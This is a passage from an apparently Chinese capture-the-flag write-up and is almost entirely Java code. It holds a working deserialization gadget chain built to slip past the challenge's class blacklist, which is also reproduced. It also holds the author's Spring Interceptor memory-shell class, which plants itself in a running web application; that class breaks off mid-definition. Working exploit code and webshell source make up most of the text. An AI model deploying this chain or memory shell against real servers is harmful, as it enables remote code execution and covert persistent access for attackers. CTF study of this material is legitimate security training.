</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">badAttributeValueExpException</span><span class="p">,</span><span class="s">&#34;val&#34;</span><span class="p">,</span><span class="n">jsonNodes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 生成私钥和公钥</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">KeyPairGenerator</span><span class="w"> </span><span class="n">keyPairGen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">KeyPairGenerator</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&#34;RSA&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">keyPairGen</span><span class="p">.</span><span class="na">initialize</span><span class="p">(</span><span class="n">2048</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">KeyPair</span><span class="w"> </span><span class="n">keyPair</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">keyPairGen</span><span class="p">.</span><span class="na">generateKeyPair</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PrivateKey</span><span class="w"> </span><span class="n">privateKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">keyPair</span><span class="p">.</span><span class="na">getPrivate</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 创建签名引擎</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Signature</span><span class="w"> </span><span class="n">signingEngine</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Signature</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&#34;SHA256withRSA&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">signingEngine</span><span class="p">.</span><span class="na">initSign</span><span class="p">(</span><span class="n">privateKey</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">SignedObject</span><span class="w"> </span><span class="n">signedObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SignedObject</span><span class="p">(</span><span class="n">badAttributeValueExpException</span><span class="p">,</span><span class="n">privateKey</span><span class="p">,</span><span class="n">signingEngine</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">POJONode</span><span class="w"> </span><span class="n">node</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">POJONode</span><span class="p">(</span><span class="n">signedObject</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        BadAttributeValueExpException bad=new BadAttributeValueExpException(111);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        setFiled(bad,&#34;val&#34;,node);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">XString</span><span class="w"> </span><span class="n">xString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">XString</span><span class="p">(</span><span class="s">&#34;123&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;</span><span class="n">XString</span><span class="o">&gt;</span><span class="w"> </span><span class="n">Constructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XString</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//XString xString = Constructor.newInstance(new XString(&#34;123&#34;));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">XString</span><span class="w"> </span><span class="n">xString2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Constructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">node</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HotSwappableTargetSource</span><span class="w"> </span><span class="n">hotSwappableTargetSource</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HotSwappableTargetSource</span><span class="p">(</span><span class="n">xString</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HotSwappableTargetSource</span><span class="w"> </span><span class="n">hotSwappableTargetSource2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HotSwappableTargetSource</span><span class="p">(</span><span class="n">node</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">hotSwappableTargetSource2</span><span class="p">,</span><span class="s">&#34;111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//hashMap.put(hotSwappableTargetSource,&#34;222&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">putVal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hashMap</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;putVal&#34;</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">putVal</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">putVal</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="n">123</span><span class="p">,</span><span class="n">hotSwappableTargetSource</span><span class="p">,</span><span class="s">&#34;222&#34;</span><span class="p">,</span><span class="kc">false</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        Field modCount = hashMap.getClass().getDeclaredField(&#34;size&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        modCount.setAccessible(true);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        modCount.set(hashMap,2);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">bos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">bos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">hashMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">serializedBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bos</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">base64EncodedBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">encodeBase64</span><span class="p">(</span><span class="n">serializedBytes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">base64EncodedBytes</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 从文件中反序列化对象</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">base64EncodedData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">decodedBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">decodeBase64</span><span class="p">(</span><span class="n">base64EncodedData</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 反序列化</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteArrayInputStream</span><span class="w"> </span><span class="n">bis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">serializedBytes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MyObjectInputStream</span><span class="p">(</span><span class="n">bis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFiled</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">templates</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">values</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">declaredField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">templates</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="n">values</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><strong>MyObjectInputStream</strong></p>
<p>这个是题目的过滤，可以看到过滤了CC5开头</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// Source code recreated from a .class file by IntelliJ IDEA</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// (powered by FernFlower decompiler)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InvalidClassException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectStreamClass</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MyObjectInputStream</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">blackList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;AbstractTranslet&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Templates&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;TemplatesImpl&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;javax.management&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;swing&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;awt&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;fastjson&#34;</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">MyObjectInputStream</span><span class="p">(</span><span class="n">InputStream</span><span class="w"> </span><span class="n">in</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">(</span><span class="n">in</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="nf">MyObjectInputStream</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">SecurityException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">resolveClass</span><span class="p">(</span><span class="n">ObjectStreamClass</span><span class="w"> </span><span class="n">desc</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">blackList</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">var3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">length</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">var4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">var4</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">var3</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">var4</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">black</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="o">[</span><span class="n">var4</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">desc</span><span class="p">.</span><span class="na">getName</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="n">black</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvalidClassException</span><span class="p">(</span><span class="s">&#34;Unauthorized deserialization attempt&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">desc</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kd">super</span><span class="p">.</span><span class="na">resolveClass</span><span class="p">(</span><span class="n">desc</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><strong>Interceptor_demo</strong></p>
<p>这个是我自己写的<code>spring的Interceptor内存马</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.aopalliance.intercept.Interceptor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.lang.Nullable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.context.WebApplicationContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.context.request.RequestContextHolder</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.HandlerInterceptor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.ModelAndView</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletRequest</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletResponse</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.BufferedReader</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InputStreamReader</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.PrintWriter</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Method</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@RestController</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Interceptor_demo</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">AbstractTranslet</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">HandlerInterceptor</span><span class="p">,</span><span class="n">Interceptor</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Interceptor_demo</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;main&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">WebApplicationContext</span><span class="p">)</span><span class="w"> </span><span class="n">RequestContextHolder</span><span class="p">.</span><span class="na">currentRequestAttributes</span><span class="p">().</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RequestMappingHandlerMapping</span><span class="w"> </span><span class="n">bean</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">context</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">bean</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">context</span><span class="p">.</span><span class="na">getBean</span><span class="p">(</span><span class="n">RequestMappingHandlerMapping</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">bean</span><span class="p">.</span><span class="na">setInterceptors</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Interceptor</span><span class="o">[]</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">Interceptor_demo</span><span class="p">(</span><span class="s">&#34;a&#34;</span><span class="p">)});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.web.servlet.handler.AbstractHandlerMapping&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">initApplicationContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass2</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;initApplicationContext&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">initApplicationContext</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">initApplicationContext</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">bean</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;1111111111111111111111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">DOM</span><span class="w"> </span><span class="n">document</span><span class="p">,</span><span class="w"> </span><span class="n">SerializationHandler</span><span class="o">[]</span><span class="w"> </span><span class="n">handlers</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">TransletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
